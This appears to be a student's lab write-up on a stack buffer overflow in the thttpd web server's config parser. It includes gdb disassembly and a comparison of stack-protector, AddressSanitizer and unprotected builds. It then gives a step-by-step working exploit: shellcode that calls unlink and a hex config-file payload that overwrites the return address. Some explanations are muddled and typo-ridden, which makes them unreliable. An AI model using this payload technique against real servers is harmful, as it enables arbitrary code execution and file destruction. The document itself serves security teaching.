   0x0000000000404c08 <+808>:	bt     %rax,%r14
   0x0000000000404c0c <+812>:	jae    0x404960 <read_config+128>
   0x0000000000404c12 <+818>:	nopw   0x0(%rax,%rax,1)
   0x0000000000404c18 <+824>:	add    $0x1,%rbx
   0x0000000000404c1c <+828>:	movzbl (%rbx),%edx
   0x0000000000404c1f <+831>:	movb   $0x0,-0x1(%rbx)
   0x0000000000404c23 <+835>:	cmp    $0x20,%dl
   0x0000000000404c26 <+838>:	ja     0x404960 <read_config+128>
   0x0000000000404c2c <+844>:	bt     %rdx,%r14
   0x0000000000404c30 <+848>:	jb     0x404c18 <read_config+824>
   0x0000000000404c32 <+850>:	jmpq   0x404960 <read_config+128>
---Type <return> to continue, or q <return> to quit---
   0x0000000000404c37 <+855>:	mov    %r13,%rsi
   0x0000000000404c3a <+858>:	mov    %rbp,%rdi
   0x0000000000404c3d <+861>:	callq  0x404630 <no_value_required>
   0x0000000000404c42 <+866>:	movl   $0x1,0x2113a8(%rip)        # 0x615ff4 <debug>
   0x0000000000404c4c <+876>:	jmp    0x404bd0 <read_config+752>
   0x0000000000404c4e <+878>:	mov    %r13,%rsi
   0x0000000000404c51 <+881>:	mov    %rbp,%rdi
   0x0000000000404c54 <+884>:	callq  0x404670 <value_required>
   0x0000000000404c59 <+889>:	mov    %r13,%rdi
   0x0000000000404c5c <+892>:	callq  0x402880 <atoi@plt>
   0x0000000000404c61 <+897>:	mov    %ax,0x211388(%rip)        # 0x615ff0 <port>
   0x0000000000404c68 <+904>:	jmpq   0x404bd0 <read_config+752>
   0x0000000000404c6d <+909>:	xor    %r13d,%r13d
   0x0000000000404c70 <+912>:	jmpq   0x40497d <read_config+157>
   0x0000000000404c75 <+917>:	mov    %r13,%rsi
   0x0000000000404c78 <+920>:	mov    %rbp,%rdi
   0x0000000000404c7b <+923>:	callq  0x404670 <value_required>
   0x0000000000404c80 <+928>:	mov    %r13,%rdi
   0x0000000000404c83 <+931>:	callq  0x404890 <e_strdup>
   0x0000000000404c88 <+936>:	mov    %rax,0x211359(%rip)        # 0x615fe8 <dir>
   0x0000000000404c8f <+943>:	jmpq   0x404bd0 <read_config+752>
   0x0000000000404c94 <+948>:	mov    %r13,%rsi
   0x0000000000404c97 <+951>:	mov    %rbp,%rdi
---Type <return> to continue, or q <return> to quit---
   0x0000000000404c9a <+954>:	callq  0x404630 <no_value_required>
   0x0000000000404c9f <+959>:	movl   $0x1,0x21132f(%rip)        # 0x615fd8 <do_chroot>
   0x0000000000404ca9 <+969>:	movl   $0x1,0x21131d(%rip)        # 0x615fd0 <no_symlink_check>
   0x0000000000404cb3 <+979>:	jmpq   0x404bd0 <read_config+752>
   0x0000000000404cb8 <+984>:	mov    %r13,%rsi
   0x0000000000404cbb <+987>:	mov    %rbp,%rdi
   0x0000000000404cbe <+990>:	callq  0x404630 <no_value_required>
   0x0000000000404cc3 <+995>:	movl   $0x0,0x21130b(%rip)        # 0x615fd8 <do_chroot>
   0x0000000000404ccd <+1005>:	movl   $0x0,0x2112f9(%rip)        # 0x615fd0 <no_symlink_check>
   0x0000000000404cd7 <+1015>:	jmpq   0x404bd0 <read_config+752>
   0x0000000000404cdc <+1020>:	mov    %r13,%rsi
   0x0000000000404cdf <+1023>:	mov    %rbp,%rdi
   0x0000000000404ce2 <+1026>:	callq  0x404630 <no_value_required>
   0x0000000000404ce7 <+1031>:	movl   $0x0,0x2112df(%rip)        # 0x615fd0 <no_symlink_check>
   0x0000000000404cf1 <+1041>:	jmpq   0x404bd0 <read_config+752>
   0x0000000000404cf6 <+1046>:	mov    %r13,%rsi
   0x0000000000404cf9 <+1049>:	mov    %rbp,%rdi
   0x0000000000404cfc <+1052>:	callq  0x404670 <value_required>
   0x0000000000404d01 <+1057>:	mov    %r13,%rdi
   0x0000000000404d04 <+1060>:	callq  0x404890 <e_strdup>
   0x0000000000404d09 <+1065>:	mov    %rax,0x2112d0(%rip)        # 0x615fe0 <data_dir>
   0x0000000000404d10 <+1072>:	jmpq   0x404bd0 <read_config+752>
   0x0000000000404d15 <+1077>:	mov    %r13,%rsi
---Type <return> to continue, or q <return> to quit---
   0x0000000000404d18 <+1080>:	mov    %rbp,%rdi
   0x0000000000404d1b <+1083>:	callq  0x404630 <no_value_required>
   0x0000000000404d20 <+1088>:	movl   $0x1,0x2112a6(%rip)        # 0x615fd0 <no_symlink_check>
   0x0000000000404d2a <+1098>:	jmpq   0x404bd0 <read_config+752>
   0x0000000000404d2f <+1103>:	mov    %r13,%rsi
   0x0000000000404d32 <+1106>:	mov    %rbp,%rdi
   0x0000000000404d35 <+1109>:	callq  0x404670 <value_required>
   0x0000000000404d3a <+1114>:	mov    %r13,%rdi
   0x0000000000404d3d <+1117>:	callq  0x404890 <e_strdup>
   0x0000000000404d42 <+1122>:	mov    %rax,0x21122f(%rip)        # 0x615f78 <user>
   0x0000000000404d49 <+1129>:	jmpq   0x404bd0 <read_config+752>
   0x0000000000404d4e <+1134>:	mov    %r13,%rsi
   0x0000000000404d51 <+1137>:	mov    %rbp,%rdi
   0x0000000000404d54 <+1140>:	callq  0x404670 <value_required>
   0x0000000000404d59 <+1145>:	mov    %r13,%rdi
   0x0000000000404d5c <+1148>:	callq  0x402880 <atoi@plt>
   0x0000000000404d61 <+1153>:	mov    %eax,0x211251(%rip)        # 0x615fb8 <cgi_limit>
   0x0000000000404d67 <+1159>:	jmpq   0x404bd0 <read_config+752>
   0x0000000000404d6c <+1164>:	mov    %r13,%rsi
   0x0000000000404d6f <+1167>:	mov    %rbp,%rdi
   0x0000000000404d72 <+1170>:	callq  0x404670 <value_required>
   0x0000000000404d77 <+1175>:	mov    %r13,%rdi
   0x0000000000404d7a <+1178>:	callq  0x404890 <e_strdup>
---Type <return> to continue, or q <return> to quit---
   0x0000000000404d7f <+1183>:	mov    %rax,0x21123a(%rip)        # 0x615fc0 <cgi_pattern>
   0x0000000000404d86 <+1190>:	jmpq   0x404bd0 <read_config+752>
   0x0000000000404d8b <+1195>:	mov    %r12,%rdi
   0x0000000000404d8e <+1198>:	callq  0x4023e0 <fclose@plt>
   0x0000000000404d93 <+1203>:	add    $0x70,%rsp
   0x0000000000404d97 <+1207>:	pop    %rbx
   0x0000000000404d98 <+1208>:	pop    %rbp
   0x0000000000404d99 <+1209>:	pop    %r12
   0x0000000000404d9b <+1211>:	pop    %r13
   0x0000000000404d9d <+1213>:	pop    %r14
=> 0x0000000000404d9f <+1215>:	retq   
   0x0000000000404da0 <+1216>:	mov    %r13,%rsi

So found that
0x0000000000404d9f <+1215>:	retq  

From this, it can be seen that program compared to the previous 2 programs doesn’t have
program overflow checking.

with the flasg called -zexecstack, we can execute any programs on the stack. But as we got
SIGSEGV, it means that we can not execute something that is not executable and are outside 
of the scope of the stack.


(8).
used the command
./configure \
   LDFLAGS="-Xlinker --rpath=/usr/local/cs/gcc-$(gcc -dumpversion)/lib"

I created the three variants files by the following commands:
make clean
make CFLAGS='-S -O2 -fno-inline -fstack-protector-strong'
mv src/thttpd.o src/thttpd-sp.s

make clean
make CFLAGS='-S -O2 -fno-inline -static-libasan -fsanitize=address'
mv src/thttpd.o src/thttpd-as.s

make clean
make CFLAGS='-S -O2 -fno-inline -fno-stack-protector -zexecstack'
mv src/thttpd.o src/thttpd-no.s 

As i can see the assembly code of each of the variants that are created. I can see that thttpd-as.s 
has about 9k instruction codes while other 2 have about 4.5 instruction codes. The varinat “NO” 
doesn’t handle overflow because it never detect SIGGSEGV

-fstack-protector-strong
Buffer overrun helps to check the relies around the use of canaries that surround the
buffer on either sides. It calls __stack_chk_fail() because it checks only one time, and when it does
it does the entire read_config. So when read the buffer in, handle_read() doesn’t requires extra code. 
This is one of the reason SP and NO variants are the same. But at the same time it can been seen that
SP has assembly greater than NO because canaries after the read_config and the invocation of the
 __stack_chk_fail()
 

-fsanitize=address
It can be seen that handle_read() for As is many more because it create the are of shadow memory 
around the buffer and maps that shadowed memory to bad memory. So,it always check the bytes 
that are loading into the buffer is the shadow memory or not.But in As handle_read(), because there is 
constant check, it can check whether the address is shadowed or not. If it encounter the memory is 
shadow, it poisons the value and throws a segmentation fault.   

For the NO variant, the handle_read() behaved same as SP, however it did not do
any checking even past handle_read() and just crashed. 



(9).
(A)
moved to the src file
created the random file called foo.txt

(B)
To find the address of the target.txt
i wrote the file called unlink.c with the following code on it
 1 #include<unistd.h>
  2 int main() {
  3 char file[] = "target.txt";
  4 unlink(file);
  5  return 0;
  6 }

rand the command to get the assembly
$ gcc -g -c unlink.c 
$ objdump -d unlink.o

unlink.o:     file format elf64-x86-64

got
Disassembly of section .text:

0000000000000000 <main>:
   0:	55                   	push   %rbp
   1:	48 89 e5             	mov    %rsp,%rbp
   4:	48 83 ec 10          	sub    $0x10,%rsp
   8:	48 b8 74 61 72 67 65 	movabs $0x742e746567726174,%rax
   f:	74 2e 74 
  12:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
  16:	66 c7 45 f8 78 74    	movw   $0x7478,-0x8(%rbp)
  1c:	c6 45 fa 00          	movb   $0x0,-0x6(%rbp)
  20:	48 8d 45 f0          	lea    -0x10(%rbp),%rax
  24:	48 89 c7             	mov    %rax,%rdi
  27:	e8 00 00 00 00       	callq  2c <main+0x2c>
  2c:	b8 00 00 00 00       	mov    $0x0,%eax
  31:	c9                   	leaveq 
  32:	c3                   	retq   


Got the hex value for the address of target.txt: 74 61 72 67 65 74 2e 74 78 74 00

(C)
 Then get the starting address of the buffer by running following command
$ gdb thttpd-no$ (gdb) break read_config$ (gdb) r -C test.txt -p 12387 –D

got the starting address of the buffer
Breakpoint 1, read_config (filename=0x7fffffffe4fc "test.txt") at thttpd.c:1000
1000	    {

(D)
Get the ending address (or return address) of the buffer
(gdb) info register $rsp
rsp            0x7fffffffcf88	0x7fffffffcf88

(E)
Put target.txt in front of the return address.So compute return address or ending address of the buffer – 160x7fffffffcf88 – 16 = 0x7fffffffcf78

(F)
Write unlink.s file
movq $0x7fffffffcf78, %rdimovq $0x57, %raxsyscall

(G)
Convert unlink.s to unlink.o and note down the hex value of the function$ gcc -c unlink.s$ objdump -d unlink.o

got this instruction:
Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 bf 78 cf ff ff ff 	movabs $0x7fffffffcf78,%rdi
   7:	7f 00 00 
   a:	48 c7 c0 57 00 00 00 	mov    $0x57,%rax
  11:	0f 05                	syscall 48 bf 78 cf ff ff ff 7f00 00 48 c7 c0 57 00 00 00 0f 05

(H)
Created the hex.txt buffer fileSince we need to have a config file,o port= in the beginning of the file, we need to have 70 6f 72 74 3d 00 00 00 at the beginning ofthe file.o Followed by the hexadecimal value of the unlink.o file obtained in the previous step.o Followed by zeroso Address of target.txto Value of (starting of buffer +8) Hint: Starting of buffer obtained from step 3.

 1 70 6f 72 74 3d 00 00 00 48 bf 78 cf ff ff ff 7f
  2    00 00 48 c7 c0 57 00 00 00 0f 05 00 00 00 00 00
  3    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  4    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  5    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  6    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  7    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  8    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  9    00 00 00 00 00 00 00 00 74 61 72 67 65 74 2e 74
 10    78 74 00 00 00 00 00 00 7F FF FF FF E5 04 00 00

and saved it

(I)
Ran the hex2raw file downloaded from CCLE and run it as below to generate the exploit.txt file(which is anASCII file)$ ./hex2raw <hex.txt >exploit.txt

(J)
Compiled thttpd-no with exploit.txt$ touch target.txt$ gdb thttpd-no$ (gdb) r -C exploit.txt -p 12906 -D

(K)
I got a SIGSEGV, quit gdb and check for target.txt (ls ). I found it is deleted.
